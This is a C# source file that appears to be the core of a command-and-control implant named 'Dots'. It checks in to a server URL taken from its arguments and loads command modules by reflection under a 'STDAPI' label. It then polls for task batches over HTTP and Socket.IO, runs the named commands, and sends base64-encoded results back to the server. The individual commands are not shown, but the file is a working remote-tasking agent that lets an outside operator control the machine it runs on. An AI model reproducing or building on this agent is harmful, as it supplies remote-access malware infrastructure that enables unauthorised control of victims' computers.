using Dots.Models;
using System;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using SocketIOClient;
using System.Threading;

namespace Dots
{
    public class Program
    {
        private static TaskManager _taskManager;
        private static DotsProperties _dotsProperty = new DotsProperties();
        private static SocketIO _socketIOClient;

        public static async Task Main(string[] args)
        {
            // Load STDAPI
            LoadDotsCommands();

            // Setup TaskManager for HTTP
            _taskManager = new TaskManager(args[0]);
            _taskManager.Init();
            _dotsProperty.TaskManager = _taskManager;
            string _checkInTaskId = _taskManager.InitialCheckin(args[1]);
            if (_checkInTaskId == null)
            {
                return;
            }

            _taskManager.Start(_dotsProperty);


            // Setup SocketIOClient for interactive
            _socketIOClient = new SocketIO(args[0], new SocketIOOptions
            {
                Auth = _checkInTaskId
            });
            _socketIOClient.On("ping", response =>
            {
                Ping();
            });
            _socketIOClient.On("tasks", response =>
            {
                TaskRequest[] batchRequest = response.GetValue<TaskRequest[]>();
                _taskManager.ParseBatchRequest(batchRequest);
            });
            _dotsProperty.SocketIOClient = _socketIOClient;
            while (!_dotsProperty.ExecuteTasks.IsCancellationRequested)
            {
                if (_taskManager.RetrieveBatchRequest(out var tasks))
                {

                    foreach (var task in tasks)
                    {
                        ExecuteTask(task);
                    }
                }
                await Task.Delay(100);
            }
        }

        private static void Ping()
        {
            _socketIOClient.EmitAsync("pong");
        }

        private static void LoadDotsCommands()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();

            foreach (var type in assembly.GetTypes())
            {
                if (type.IsSubclassOf(typeof(DotsCommand)))
                {
                    DotsCommand command = (DotsCommand)Activator.CreateInstance(type);
                    command.DotsProperty = _dotsProperty;
                    _dotsProperty.Commands.Add(command);
                }
            }
        }

        private static void ExecuteTask(TaskRequest task)
        {
            foreach (Object command in _dotsProperty.Commands)
            {
                try
                {
                    Type commandType = command.GetType();

                    PropertyInfo nameProperty = commandType.GetProperty("Name");

                    if (nameProperty == null)
                    {
                        // The command object does not have a valid "Name" property
                        NotImplementedException exception = new NotImplementedException("Name property not implemented.");
                        throw exception;
                    }

                    if (nameProperty.PropertyType != typeof(string))
                    {
                        // The command "Name" property is not a string
                        InvalidCastException exception = new InvalidCastException("Name property not a string.");
                        throw exception;
                    }

                    MethodInfo executeMethod = commandType.GetMethod("Execute");
                    if (executeMethod == null)
                    {
                        // The command object does not have a valid "Execute" property
                        NotImplementedException exception = new NotImplementedException("Execute property not implemented.");
                        throw exception;
                    }

                    string name = (string)nameProperty.GetValue(command);

                    if (name == task.Method)
                    {
                        object result = executeMethod.Invoke(command, new object[] { task.Params });
                        if (result is byte[] bytes)
                        {
                            result = Convert.ToBase64String(bytes);
                        }
                        else if (result != null)
                        {
                            result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result.ToString()));
                        } else
                        {
                            result = "";
                        }
                        TaskResult Result = new TaskResult
                        {
                            JSONRPC = task.JSONRPC,
                            Result = (string)result,
                            Id = task.Id
                        };
                        if (_dotsProperty.Interactive)
                        {

                            _dotsProperty.SocketIOClient.EmitAsync("batch_response", Result);
                        }
                        else
                        {
                            _taskManager.SendResult(Result);
                        }
                        return;
                    }
                }
                catch (Exception ex)
                {
                    TaskError failedToExecuteError = new TaskError
                    {
                        JSONRPC = "2.0",
                        Error = new TaskErrorDetails
                        {
                            Code = -32000,
                            Message = Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.ToString())),
                        },
                        Id = task.Id
                    };
                    if (_dotsProperty.Interactive)
                    {

                        _dotsProperty.SocketIOClient.EmitAsync("batch_response", failedToExecuteError);
                    }
                    else
                    {
                        _taskManager.SendError(failedToExecuteError);
                    }
                    return;
                }
            }

            TaskError methodNotSupportedError = new TaskError
            {
                JSONRPC = task.JSONRPC,
                Error = new TaskErrorDetails
                {
                    Code = -32601,
                    Message = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{task.Method} is not supported")),
                },
                Id = task.Id,
            };
            if (_dotsProperty.Interactive) { 

                _dotsProperty.SocketIOClient.EmitAsync("batch_response", methodNotSupportedError);
            } else {
                    _taskManager.SendError(methodNotSupportedError);
            }
        }   
    }
}
